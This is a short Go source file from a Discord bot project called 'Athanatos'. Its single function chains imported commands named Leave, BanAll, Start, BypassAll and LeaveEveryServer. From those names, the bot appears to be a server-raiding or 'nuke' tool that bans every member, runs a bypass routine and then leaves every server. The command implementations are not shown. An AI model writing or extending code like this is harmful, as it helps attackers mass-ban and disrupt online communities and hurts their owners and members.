package main

import (
	"Athanatos/commands"
	"sync"

	"github.com/bwmarrin/discordgo"
)

func ConnectAll(s *discordgo.Session, m *discordgo.MessageCreate) {
	var wg sync.WaitGroup
	commands.Leave(s, m)
	commands.BanAll(s, m, &wg)
	commands.Start(s, m, &wg)
	commands.BypassAll(s, m, &wg)
	commands.LeaveEveryServer(s, m)
}
